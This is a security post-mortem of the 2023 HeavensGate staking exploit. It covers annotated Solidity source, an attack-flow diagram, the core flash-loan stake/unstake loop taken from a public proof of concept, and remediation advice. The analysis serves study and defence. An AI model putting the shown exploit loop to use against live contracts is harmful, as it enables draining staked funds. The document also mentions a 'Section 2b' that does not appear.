# HeavensGate — Token Logic Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-09-01 |
| **Protocol** | HeavensGate |
| **Chain** | Ethereum |
| **Loss** | ~8 ETH |
| **Attacker** | [0x6ce9fa08f139f5e4...](https://etherscan.io/address/0x6ce9fa08f139f5e48bc607845e57efe9aa34c9f6) |
| **Attack Tx** | [0xe28ca1f43036f476...](https://etherscan.io/tx/0xe28ca1f43036f4768776805fb50906f8172f75eba3bf1d9866bcd64361fda834) |
| **Vulnerable Contract** | HeavensGate Staking [0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8](https://etherscan.io/address/0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8) (0x8faa53a742fc732b... in the PoC is the attacker's flash-loan contract) |
| **Root Cause** | The `stake()` function calls `rebase()` before distributing sHATE, and `unstake()` also triggers `rebase()` when `_rebase=true`. Cycling stake/unstake forces multiple epoch advances within one transaction, inflating the amount of HATE receivable on each unstake |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/HeavensGate_exp.sol) |

---
## 1. Vulnerability Overview

The HeavensGate staking contract (`0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8`) allows users to stake HATE tokens in exchange for sHATE (a rebasing share token). The exploit abuses the fact that both `stake()` and `unstake()` invoke `rebase()` internally. By taking a flash loan of HATE tokens and rapidly cycling stake/unstake within a single transaction, the attacker forced multiple rebase epochs to advance. Each rebase increased `epoch.distribute` (additional HATE to distribute as rewards), allowing the attacker to extract more HATE from the contract than was deposited on each unstake cycle.

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

The preliminary pseudocode below is superseded by the real Sourcify-verified source in Section 2b.

---
### On-chain Source Code

Source: **Sourcify-verified** — HeavensGate Staking / 0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8 (Ethereum Mainnet)
https://sourcify.dev/server/files/any/1/0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8

Note: `0x8faa53a742fc732b04db4090a21e955fe5c230be` in the doc header is the attacker's flash-loan contract. The exploited (victim) contract is the Staking contract at `0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8`.

```solidity
// From: contracts/Staking.sol

IERC20 public immutable HATE;
IsHATE public immutable sHATE;  // rebasing staked token — circulatingSupply() inflates on each rebase

struct Epoch {
    uint256 length;    // in seconds
    uint256 number;    // since inception
    uint256 end;       // timestamp
    uint256 distribute;// amount to distribute next rebase
}
Epoch public epoch;

function stake(address _to, uint256 _amount) external {
    HATE.transferFrom(msg.sender, address(this), _amount);
    rebase();                       // ❌ rebase() called BEFORE sHATE.transfer, inflating sHATE supply
    sHATE.transfer(_to, _amount);  // ❌ transfers _amount of sHATE but sHATE has just rebased upward
}

function unstake(address _to, uint256 _amount, bool _rebase) external {
    if (_rebase) rebase();          // ❌ rebase() called again inside unstake when _rebase=true
    sHATE.transferFrom(msg.sender, address(this), _amount);
    require(_amount <= HATE.balanceOf(address(this)), "Insufficient HATE balance in contract");
    HATE.transfer(_to, _amount);   // ❌ returns same _amount of HATE regardless of rebase inflation
}

function rebase() public {
    if (epoch.end <= block.timestamp) {
        sHATE.rebase(epoch.distribute, epoch.number); // inflates sHATE total supply

        epoch.end = epoch.end + epoch.length;
        epoch.number++;

        if (address(distributor) != address(0)) {
            distributor.distribute();
        }

        uint256 balance = HATE.balanceOf(address(this));
        uint256 staked = sHATE.circulatingSupply();

        if (balance <= staked) {
            epoch.distribute = 0;
        } else {
            epoch.distribute = balance - staked; // ❌ distribute > 0 as long as HATE balance exceeds sHATE supply
        }
    }
}
```

**Why it is exploitable (identify the bug from the code):**
- `stake()` calls `rebase()` before transferring `sHATE` to the staker. If a rebase epoch has elapsed, sHATE's total supply inflates (via `sHATE.rebase()`), but the staker still receives exactly `_amount` of sHATE — which is now worth more HATE per token after the supply inflation.
- By cycling stake → unstake (with `_rebase=true`) in a tight loop (as the PoC does 3–30 times per flash-loan call), each cycle triggers another rebase. Each rebase inflates `epoch.distribute` proportionally to the HATE balance in the contract, which the attacker's own stake has just increased. The attacker receives progressively more HATE on each unstake than they deposited.
- The fundamental flaw: **`rebase()` is called inside both `stake` and `unstake` with no access control or epoch-advancement guard between cycles**, enabling an attacker to force multiple epoch advances within a single transaction.

```solidity
// ✅ Fix: prevent mid-transaction rebase exploitation
function stake(address _to, uint256 _amount) external {
    rebase(); // rebase before receiving HATE, not after
    HATE.transferFrom(msg.sender, address(this), _amount);
    sHATE.transfer(_to, _amount);
}
// Also: add a per-epoch stake/unstake cooldown or restrict rebase() to distributor-only calls.
```

## 3. Attack Flow (ASCII Diagram)
```
Attacker
  ├─① Flash borrow HATE from HATE/ETH Uniswap pair (90% of pool)
  │
  ├─② Loop N times (3 times in Exploit1, 30 times in Exploit2):
  │     a. stake(address(this), HATE_balance)    → rebase() fires → sHATE inflated
  │     b. unstake(address(this), sHATE_balance, true) → rebase() fires again
  │        → HATE returned = _amount (pre-rebase) but sHATE was worth more post-rebase
  │        → net HATE extracted > deposited each cycle
  │
  ├─③ Repay flash loan (amount * 1000/997 + 1)
  │
  └─④ Swap remaining surplus HATE → WETH for profit (~8 ETH total)
```

---
## 4. PoC Code (Core Logic + Comments)
```solidity
// From DeFiHackLabs HeavensGate_exp.sol (verbatim core logic)

function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata data) external {
    uint256 i = 0;
    while (i < uint8(data[0])) {           // data[0] = loop count (3 or 30)
        uint256 balanceAttacker = HATE.balanceOf(address(this));
        HATEStaking.stake(address(this), balanceAttacker);   // ❌ triggers rebase inside stake
        uint256 sTokenBalance = sHATE.balanceOf(address(this));
        HATEStaking.unstake(address(this), sTokenBalance, true); // ❌ _rebase=true triggers another rebase
        // Each cycle: HATE returned grows because epoch.distribute increased from prior rebase
        i += 1;
    }
    HATE.transfer(address(HATE_ETH_Pair), uint256(amount0 * 1000 / 997) + 1);
}
```

---
## 5. Vulnerability Classification (Table)
| Category | Details |
|------|------|
| **Vulnerability Type** | Rebase / staking arithmetic — forced epoch inflation via stake/unstake cycle |
| **CWE** | CWE-682: Incorrect Calculation |
| **OWASP DeFi** | Rebase token accounting error |
| **Severity** | High |

---
## 6. Remediation Recommendations
1. **Separate rebase from user actions**: `rebase()` should only be callable by the distributor or at epoch boundaries, not inside `stake()`/`unstake()`.
2. **Add a per-epoch cooldown**: Prevent more than one epoch advance per block or per user transaction.
3. **Snapshot accounting**: Record the sHATE↔HATE exchange rate at stake time and use that rate on unstake, preventing rebase inflation from benefiting the same caller within one transaction.
4. **Reentrancy-style guard on epoch**: Use a boolean guard `epochAdvancing` to prevent recursive or looping epoch advances.

---
## 7. Lessons Learned
- Rebasing token staking contracts must carefully separate the rebase trigger from user-initiated deposit/withdrawal paths.
- Calling `rebase()` inside both `stake` and `unstake` — without a guard preventing multiple advances per transaction — creates a self-amplifying loop that can drain the entire HATE balance held by the staking contract.
- Flash loans make these loops economically viable at low cost: the attacker only needs enough capital to make the loop profitable after repaying the loan fee.